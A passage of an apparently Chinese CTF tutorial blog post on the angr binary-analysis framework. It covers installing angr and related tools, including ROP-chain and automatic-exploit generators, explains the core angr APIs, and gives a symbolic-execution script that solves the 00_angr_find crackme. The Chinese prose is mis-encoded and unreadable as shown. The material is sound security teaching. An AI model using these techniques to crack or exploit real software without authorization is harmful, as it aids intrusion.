    <content type="html"><![CDATA[<p>ä½ è¯´çš„å¯¹ï¼Œä½†æ˜¯ <a href="https://github.com/angr/angr">angr</a> æ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è·¨å¹³å°å¼€æºäºŒè¿›åˆ¶åˆ†ææ¡†æ¶â€¦</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://github.com/angr/angr">angr</a> æ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è·¨å¹³å°å¼€æºäºŒè¿›åˆ¶<strong>æ··åˆ</strong>ï¼ˆConcolicï¼‰åˆ†ææ¡†æ¶ï¼Œä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç³»åˆ—å®ç”¨çš„äºŒè¿›åˆ¶åˆ†æå·¥å…·ï¼Œæ›´å¤šå…³äº angr çš„ä»‹ç»ä¿¡æ¯å¯ä»¥çœ‹ä»–ä»¬çš„ <a href="https://angr.io/">å®˜ç½‘</a> ï¼Œå…³äº angr æä¾›çš„ API åˆ™å¯ä»¥æŸ¥çœ‹<a href="https://api.angr.io/">æ–‡æ¡£</a></p><p><a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a> æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„å…¥é—¨çº§ angr ç»ƒæ‰‹é¡¹ç›®ï¼Œåˆšå¥½ç¬”è€…æœ€è¿‘åœ¨å­¦ angr ç›¸å…³çš„ä¸œè¥¿ï¼Œæ‰€ä»¥å†³å®šä»è¿™ä¸ªé¡¹ç›®å¼€å§‹å…¥é—¨</p><h2 id="PRE-å®‰è£…-angr-åŠç›¸å…³ç»„ä»¶"><a href="#PRE-å®‰è£…-angr-åŠç›¸å…³ç»„ä»¶" class="headerlink" title="PRE.å®‰è£… angr åŠç›¸å…³ç»„ä»¶"></a>PRE.å®‰è£… angr åŠç›¸å…³ç»„ä»¶</h2><p>é¦–å…ˆæ˜¯ä¸€äº›ä¾èµ–é¡¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-multilib</span><br></code></pre></td></tr></table></figure><p>angr æœ¬ä½“å®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯ <a href="https://github.com/angr/angrop">angrop</a>ï¼Œå¯ä»¥è‡ªåŠ¨æ”¶é›† ROP gadget ä»¥åŠæ„å»º ROP chain</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angrop</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/angr/patcherex">patcherex</a> ä¹Ÿæ˜¯ angr å›¢é˜Ÿå¼€å‘çš„ï¼Œç”¨ä»¥è¿›è¡Œè‡ªåŠ¨åŒ–çš„äºŒè¿›åˆ¶åŠ å›º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install nasm clang</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install clang-10 gcc-avr binutils-avr avr-libc</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/angr/patcherex.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> patcherex</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install -e .</span><br></code></pre></td></tr></table></figure><blockquote><p>é˜¿é‡Œäº‘æºå¥½åƒå¦¹æœ‰ <code>compilerex</code> è¿™ä¸ªä¾èµ–é¡¹ï¼Œåæ­£æœ€åğŸ‘´ä¹Ÿå¦¹å®‰è£…ä¸Šï¼Œéš¾å—</p></blockquote><p><a href="https://github.com/angr/rex">rex</a> åˆ™æ˜¯ angr å›¢é˜Ÿå¼€å‘çš„è‡ªåŠ¨ exp ç”Ÿæˆå™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">ğŸ‘´å¦¹å®‰æˆï¼Œçœ‹çœ‹å°±å¥½</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/angr/angr-management">angr-management</a> åˆ™æ˜¯å›¾å½¢åŒ–çš„ angr ç•Œé¢ï¼Œå®‰å¥½ä¹‹åç›´æ¥åœ¨ç»ˆç«¯è¾“å…¥ <code>angr-management</code> å³å¯ç›´æ¥å¯åŠ¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr-management</span><br></code></pre></td></tr></table></figure><h2 id="PRE2-angr-ctf-åŸºæœ¬é£Ÿç”¨æŒ‡åŒ—"><a href="#PRE2-angr-ctf-åŸºæœ¬é£Ÿç”¨æŒ‡åŒ—" class="headerlink" title="PRE2. angr-ctf åŸºæœ¬é£Ÿç”¨æŒ‡åŒ—"></a>PRE2. angr-ctf åŸºæœ¬é£Ÿç”¨æŒ‡åŒ—</h2><p>é¦–å…ˆæŠŠé¡¹ç›®æ‹‰åˆ°æœ¬åœ°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/jakespringer/angr_ctf.git</span><br></code></pre></td></tr></table></figure><p>ä¹‹åè¿›å…¥åˆ°ä½ æƒ³åšçš„é¢˜ç›®ç›®å½•ä¸‹ä½¿ç”¨è„šæœ¬è¿›è¡Œç¼–è¯‘ï¼Œæ¯”å¦‚è¯´ <code>00_angr_find</code>ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æŒ‡å®šä¸€ä¸ªç§å­ä»¥åŠè¾“å‡ºçš„æ–‡ä»¶åï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> 00_angr_find/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py</span> <br>Usage: ./generate.py [seed] [output_file]<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py 114514 00_angr_find</span><br></code></pre></td></tr></table></figure><h1 id="0x01-angr-ctfï¼šåŸºæœ¬ç”¨æ³•"><a href="#0x01-angr-ctfï¼šåŸºæœ¬ç”¨æ³•" class="headerlink" title="0x01. angr-ctfï¼šåŸºæœ¬ç”¨æ³•"></a>0x01. angr-ctfï¼šåŸºæœ¬ç”¨æ³•</h1><h2 id="00-angr-findï¼šè·¯å¾„æœç´¢"><a href="#00-angr-findï¼šè·¯å¾„æœç´¢" class="headerlink" title="00_angr_findï¼šè·¯å¾„æœç´¢"></a>00_angr_findï¼šè·¯å¾„æœç´¢</h2><p>æƒ¯ä¾‹æ‹–è¿› IDAï¼Œå‘ç°å…¶ä¼šè¯»å…¥ 8 å­—èŠ‚åä½¿ç”¨ä¸€ä¸ªè‡ªå®šä¹‰å‡½æ•°å¤„ç†ï¼Œæœ€åä¸å¯†ç  <code>&quot;XFQUUEQF&quot;</code> å¯¹æ¯”ï¼š<br><img src="https://s2.loli.net/2022/10/31/vcWPp1GO7uHA8q6.png" alt="image.png"></p><p>æŒ‰ç…§ä¼ ç»Ÿçš„åšé€†å‘çš„æ–¹æ³•æ˜¯å»é€† <code>complex_function()</code> ï¼Œé€†å‡ºé€»è¾‘åå†™å‡ºè§£å¯†è„šæœ¬ï¼Œä½†æœ‰äº† angr ä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨<strong>ç¬¦å·æ‰§è¡Œ</strong>ï¼ˆsymbolic executionï¼‰æ¥è¿›è¡Œè·¯å¾„çº¦æŸçš„è‡ªåŠ¨æ±‚è§£</p><blockquote><p>ç¬¦å·æ‰§è¡Œç®€å•ç†è§£ä¾¿æ˜¯å°†å˜é‡ä½œä¸ºç¬¦å·å­˜å‚¨ï¼Œé€šè¿‡åˆ†æè·¯å¾„çº¦æŸè·å¾—ç”±ç¬¦å·ç»„æˆçš„è¡¨è¾¾å¼ç»„ï¼Œæœ€åå¯¹å…¶è¿›è¡Œæ±‚è§£</p></blockquote><p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ±‚è§£çš„è·¯å¾„çº¦æŸä¾¿æ˜¯æ‰§è¡Œåˆ°è¾“å‡º <code>&quot;Good Job.&quot;</code> çš„è·¯å¾„ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©æœ€åçš„è¾“å‡ºç‚¹ <code>0x80492F0</code>ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/hdaX8FY9ZVcvIRH.png" alt="image.png"></p><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬æ¥çœ‹ angr çš„åŸºæœ¬ç”¨æ³•</p><h3 id="angr-Project-é¡¶å±‚æ¥å£"><a href="#angr-Project-é¡¶å±‚æ¥å£" class="headerlink" title="angr.Project - é¡¶å±‚æ¥å£"></a>angr.Project - é¡¶å±‚æ¥å£</h3><p>æˆ‘ä»¬è‹¥è¦ä½¿ç”¨ angr æ¥åˆ†æä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç¬¬ä¸€æ­¥åˆ™æ˜¯åˆ›å»ºä¸€ä¸ª <code>angr.Project</code> ç±»â€”â€”æˆ‘ä»¬ä¸€åˆ‡åç»­æ“ä½œéƒ½å°†åŸºäºè¿™ä¸ªç±»å®ä¾‹è¿›è¡Œå±•å¼€ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<br><span class="hljs-meta">&gt;&gt;&gt; </span>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span> <span class="hljs-comment"># file to be analyzed</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(bin_path)<br>WARNING | <span class="hljs-number">2022</span>-<span class="hljs-number">11</span>-<span class="hljs-number">23</span> <span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">30</span>,006 | cle.loader | The main binary <span class="hljs-keyword">is</span> a position-independent executable. It <span class="hljs-keyword">is</span> being loaded <span class="hljs-keyword">with</span> a base address of <span class="hljs-number">0x400000</span>.<br></code></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ª project è·å–å¯¹åº”äºŒè¿›åˆ¶æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch     <span class="hljs-comment"># architecture of the binary file</span><br>&lt;Arch AMD64 (LE)&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(proj.entry)    <span class="hljs-comment"># entry point of the binary file</span><br><span class="hljs-string">&#x27;0x401060&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.filename <span class="hljs-comment"># name of the binary file</span><br><span class="hljs-string">&#x27;./test&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><p><code>arch</code> æ˜¯ä¸€ä¸ª <code>archiinfo.Arch</code> ç±»å®ä¾‹ï¼Œå…¶åŒ…å«äº†è¿è¡Œè¯¥æ–‡ä»¶çš„ CPU ä¿¡æ¯ç­‰å„ç§æ•°æ®</p><ul><li><p><code>arch.bits</code> &amp; <code>arch.bytes</code> ï¼šCPU çš„å­—é•¿ï¼ˆå•ä½ä¸ºä½&#x2F;å­—èŠ‚ï¼‰</p></li><li><p><code>arch.name</code>ï¼šæ¶æ„åï¼Œä¾‹å¦‚  <em>X86</em>  </p></li><li><p><code>arch.memory_endness</code>ï¼šç«¯åºï¼Œå¤§ç«¯ä¸º <code>Endness.BE</code> ï¼Œå°ç«¯ä¸º <code>Endness.LE</code></p><blockquote><p>æºç é‡Œè¿˜æœ‰ä¸€ä¸ª â€œä¸­ç«¯åºâ€ <code>Endness.ME</code> ï¼šï¼‰</p></blockquote></li></ul></li></ul><h4 id="â‘ -factory-å®ç”¨ç±»å·¥å‚"><a href="#â‘ -factory-å®ç”¨ç±»å·¥å‚" class="headerlink" title="â‘  factory - å®ç”¨ç±»å·¥å‚"></a>â‘  factory - å®ç”¨ç±»å·¥å‚</h4><p><code>project.factory</code> ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€äº›å®ç”¨çš„ç±»çš„æ„é€ å™¨</p><h5 id="I-block-åŸºæœ¬å—"><a href="#I-block-åŸºæœ¬å—" class="headerlink" title="I. block - åŸºæœ¬å—"></a>I. block - åŸºæœ¬å—</h5><p>angr ä»¥åŸºæœ¬å—ä¸ºå•ä½åˆ†æä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>project.factory.block(address)</code> è·å–ç»™å®šåœ°å€æ‰€åœ¨çš„<strong>åŸºæœ¬å—</strong>â€”â€”ä¸€ä¸ª <code>Block</code> ç±»å®ä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry) <span class="hljs-comment"># extract the basic block</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.pp() <span class="hljs-comment"># pretty-print of disassemble code of the block</span><br>        _start:<br><span class="hljs-number">401060</span>  endbr64<br><span class="hljs-number">401064</span>  xor     ebp, ebp<br><span class="hljs-number">401066</span>  mov     r9, rdx<br><span class="hljs-number">401069</span>  pop     rsi<br><span class="hljs-number">40</span>106a  mov     rdx, rsp<br><span class="hljs-number">40</span>106d  <span class="hljs-keyword">and</span>     rsp, <span class="hljs-number">0xfffffffffffffff0</span><br><span class="hljs-number">401071</span>  push    rax<br><span class="hljs-number">401072</span>  push    rsp<br><span class="hljs-number">401073</span>  lea     r8, [__libc_csu_fini]<br><span class="hljs-number">40</span>107a  lea     rcx, [__libc_csu_init]<br><span class="hljs-number">401081</span>  lea     rdi, [main]<br><span class="hljs-number">401088</span>  call    qword ptr [<span class="hljs-number">0x403fe0</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instructions <span class="hljs-comment"># instructions in the block</span><br><span class="hljs-number">12</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instruction_addrs <span class="hljs-comment"># addr of each instruction</span><br>(<span class="hljs-number">4198496</span>, <span class="hljs-number">4198500</span>, <span class="hljs-number">4198502</span>, <span class="hljs-number">4198505</span>, <span class="hljs-number">4198506</span>, <span class="hljs-number">4198509</span>, <span class="hljs-number">4198513</span>, <span class="hljs-number">4198514</span>, <span class="hljs-number">4198515</span>, <span class="hljs-number">4198522</span>, <span class="hljs-number">4198529</span>, <span class="hljs-number">4198536</span>)<br></code></pre></td></tr></table></figure><h5 id="II-state-æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€"><a href="#II-state-æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€" class="headerlink" title="II. state - æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€"></a>II. state - æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€</h5><p>angr ä½¿ç”¨ <code>SimState</code> ç±»è¡¨ç¤ºä¸€ä¸ª <em>æ¨¡æ‹Ÿçš„ç¨‹åºçŠ¶æ€</em>  ï¼ˆsimulated program stateï¼‰ï¼Œæˆ‘ä»¬çš„å„ç§æ“ä½œå®é™…ä¸Šæ˜¯ç”±ä¸€ä¸ª state æ­¥è¿›åˆ°å¦ä¸€ä¸ª state çš„è¿‡ç¨‹</p><p>æˆ‘ä»¬ä½¿ç”¨ <code>project.factory.entry_state()</code> è·å–ä¸€ä¸ªç¨‹åºçš„åˆå§‹æ‰§è¡ŒçŠ¶æ€ï¼Œä½¿ç”¨ <code>project.factory.blank_state(addr)</code> è·å–ä¸€ä¸ªç¨‹åºä»æŒ‡å®šåœ°å€å¼€å§‹æ‰§è¡Œçš„ç©ºç™½çŠ¶æ€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()<br><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.blank_state(<span class="hljs-number">0xdeadbeef</span>)<br></code></pre></td></tr></table></figure><ul><li><code>state.regs</code>ï¼šå¯„å­˜å™¨çŠ¶æ€ç»„ï¼Œå…¶ä¸­æ¯ä¸ªå¯„å­˜å™¨éƒ½ä¸ºä¸€ä¸ª  <em>ä½å‘é‡</em>  ï¼ˆBitVectorï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¯„å­˜å™¨åç§°æ¥è®¿é—®å¯¹åº”çš„å¯„å­˜å™¨ï¼ˆä¾‹å¦‚ <code>state.regs.esp -= 12</code> ï¼‰</li><li><code>state.mem</code>ï¼šè¯¥çŠ¶æ€çš„å†…å­˜è®¿é—®æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ <code>state.mem[addr].type</code> å®Œæˆå†…å­˜è®¿é—®ï¼ˆä¾‹å¦‚ <code>state.mem[0x1000].long = 4</code> ï¼Œå¯¹äºè¯»è€Œè¨€è¿˜éœ€æŒ‡å®š <code>.resolved</code> æˆ– <code>.concrete</code> è¡¨ç¤ºä½å‘é‡æˆ–æ˜¯å®é™…å€¼ï¼Œä¾‹å¦‚ <code>state.mem[0x1000].long.concrete</code>ï¼‰</li><li><code>state.memory</code>ï¼šå¦ä¸€ç§å½¢å¼çš„å†…å­˜è®¿é—®æ¥å£ï¼š<ul><li><code>state.memory.load(addr, size_in_bytes)</code> ï¼šè·å–è¯¥åœ°å€ä¸ŠæŒ‡å®šå¤§å°çš„ä½å‘é‡</li><li><code>state.memory.store(addr, bitvector)</code> ï¼šå°†ä¸€ä¸ªä½å‘é‡å­˜å‚¨åˆ°æŒ‡å®šåœ°å€</li></ul></li><li><code>state.posix</code>ï¼šPOSIX ç›¸å…³çš„ç¯å¢ƒæ¥å£ï¼Œä¾‹å¦‚ <code>state.posix.dumps(fileno)</code> è·å–å¯¹åº”æ–‡ä»¶æè¿°ç¬¦ä¸Šçš„æµ</li></ul><p>é™¤äº†è¿™äº›å¯¹æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€çš„ä¿¡æ¯è·å–æ¥å£å¤–ï¼Œè¿˜æœ‰ä¸€äº›è§£å†³æ–¹æ³•çš„å¯¹åº”æ¥å£ <code>state.solver</code>ï¼Œæˆ‘ä»¬å°†åœ¨åç»­è¿›è¡Œè®²è§£</p><h5 id="III-simulation-manager-æ¨¡æ‹Ÿæ‰§è¡Œå™¨"><a href="#III-simulation-manager-æ¨¡æ‹Ÿæ‰§è¡Œå™¨" class="headerlink" title="III. simulation_manager - æ¨¡æ‹Ÿæ‰§è¡Œå™¨"></a>III. simulation_manager - æ¨¡æ‹Ÿæ‰§è¡Œå™¨</h5><p>angr å°†ä¸€ä¸ªçŠ¶æ€çš„æ‰§è¡Œæ–¹æ³•ç‹¬ç«‹æˆä¸€ä¸ª <code>SimulationManager</code> ç±»ï¼Œä»¥ä¸‹ä¸¤ç§å†™æ³•ç­‰æ•ˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simgr(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simulation_manager(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br></code></pre></td></tr></table></figure><ul><li><code>simgr.step()</code>ï¼š<strong>ä»¥åŸºæœ¬å—ä¸ºå•ä½</strong>çš„å•æ­¥æ‰§è¡Œ</li><li><code>simgr.explore(addr)</code>ï¼šè·¯å¾„æ¢ç´¢ï¼Œå³<strong>æ‰§è¡Œåˆ°æŒ‡å®šåœ°å€</strong>å¹¶è¿›è¡Œçº¦æŸæ±‚è§£ï¼Œå°†æ‰§è¡Œå®Œæˆçš„çŠ¶æ€æ”¾åœ¨ <code>simgr.found</code> åˆ—è¡¨ä¸­ï¼Œè‹¥æ— æ³•æ±‚è§£åˆ™è¯¥åˆ—è¡¨ä¸ºç©º</li></ul><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å·²ç»äº†è§£äº† angr çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•äº†ï¼Œè€Œæœ¬é¢˜æˆ‘ä»¬åªéœ€è¦æ¢ç´¢åˆ°å¯¹åº”è·¯å¾„å³å¯ï¼Œäºæ˜¯æœ€åçš„æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼Œè¯¦è§æ³¨é‡Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./00_angr_find&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F0</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    simgr.explore(find = obj_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>ä¸€ä¸‹å°±è·‘å‡ºæ¥äº†ï¼Œå¾ˆå¿«å•Š.mp4</p><p><img src="https://s2.loli.net/2022/10/31/BXmxhVOWjQdDwoE.png" alt="image.png"></p><h2 id="01-angr-avoidï¼šè·¯å¾„é¿å…"><a href="#01-angr-avoidï¼šè·¯å¾„é¿å…" class="headerlink" title="01_angr_avoidï¼šè·¯å¾„é¿å…"></a>01_angr_avoidï¼šè·¯å¾„é¿å…</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œå‘ç°å¤ªå¤§äº†ï¼ˆæµæ±—é»„è±†.jpgï¼‰</p><p><img src="https://s2.loli.net/2022/10/31/sKdFIweu56Sya9H.png" alt="image.png"></p><p>é‚£è¿™é‡Œæˆ‘ä»¬æ‰‹åŠ¨åˆ†æä¸€ä¸‹ï¼Œmain çš„é€»è¾‘è¿˜æ˜¯æƒ¯ä¾‹è¯»å…¥ 8 å­—ç¬¦ä½œä¸º s1ï¼Œè€Œ s2 æ˜¯ä¸€ä¸ªå›ºå®šå€¼çš„å­—ç¬¦ä¸²ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/xJFCTN5OZVsjnkG.png" alt="image.png"></p><p>ä¹‹åå¤§æ¦‚å°±æ˜¯ä¼šå¯¹ s1ã€s2 è¿›è¡Œä¸€å®šå¤„ç†å¹¶åœ¨å„ç§ä»£ç å—é—´è·³è½¬ï¼Œæœ‰çš„è·¯å¾„ä¸Šä¼šè°ƒç”¨åˆ° <code>avoid_me()</code> ï¼Œæœ€åéƒ½ä¼šè°ƒç”¨åˆ° <code>maybe_good()</code> ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/fRWJnZhMtyD5qo6.png" alt="image.png"></p><p>é‚£ä¹ˆ <code>maybe_good()</code> å‡½æ•°çœ‹æ ·å­åº”è¯¥æ˜¯æˆ‘ä»¬æœ€ç»ˆè¦æ±‚è§£çš„è·¯å¾„ç»ˆç‚¹ï¼Œåªè¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š1ï¼‰<code>should_succeed != 0</code> 2ï¼‰<code>s1 == s2</code> ä¾¿è¯´æ˜æˆ‘ä»¬æˆåŠŸäº†ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/6d8uNkXWAoR1PM7.png" alt="image.png"></p><p>è€Œ <code>avoid_me()</code>ä¼šå°†å˜é‡ <code>should_succeed</code> ç½® 0ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åœ¨æ‰§è¡Œæ—¶åº”è¯¥é¿å…è°ƒç”¨äº†è¯¥å‡½æ•°çš„è·¯å¾„ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/dQs5x4cuhTl2AzD.png" alt="image.png"></p><p>å¦‚æœç¡¬é€†çš„è¯é€»è¾‘è¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼ˆ<del>åæ­£ğŸ‘´è‚¯å®šä¸æ„¿æ„æ‰‹åŠ¨é€†</del>ï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ angr è¿›è¡Œæ±‚è§£ï¼Œç›®æ ‡è·¯å¾„è¿˜æ˜¯è¾“å‡º <code>&quot;Good Job.&quot;</code>ï¼Œä¸è¿‡è¿™ä¸€é¢˜æˆ‘ä»¬å¤šäº†ä¸€ä¸ªçº¦æŸï¼šé¿å¼€ <code>avoid_me()</code> å‡½æ•°çš„æ‰§è¡Œ</p><p>å¦‚æœæˆ‘ä»¬ä¸é¿å¼€è¿™ä¸ªè¿‘ä¹æ— å¤„ä¸åœ¨çš„ <code>avoid_me()</code> å‡½æ•°ï¼Œåˆ™ä¼šé€ æˆ<strong>è·¯å¾„çˆ†ç‚¸</strong>ï¼ˆPath Explosionï¼‰ï¼Œä»è€Œå¤§å¹…åº¦å¢åŠ æ±‚è§£æ—¶é—´ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨è·¯å¾„çº¦æŸçš„æ±‚è§£ä¸Šé¿å¼€è¯¥å‡½æ•°</p><h3 id="simgr-explore-çš„åŸºæœ¬ç”¨æ³•"><a href="#simgr-explore-çš„åŸºæœ¬ç”¨æ³•" class="headerlink" title="simgr.explore() çš„åŸºæœ¬ç”¨æ³•"></a>simgr.explore() çš„åŸºæœ¬ç”¨æ³•</h3><p>æˆ‘ä»¬é€šå¸¸ä½¿ç”¨æ¨¡æ‹Ÿå™¨çš„ <code>.explore()</code> æ–¹æ³•æ¥è¿›è¡Œè·¯å¾„æ¢ç´¢ï¼Œä¼ å…¥çš„é»˜è®¤å‚æ•°ä¸º 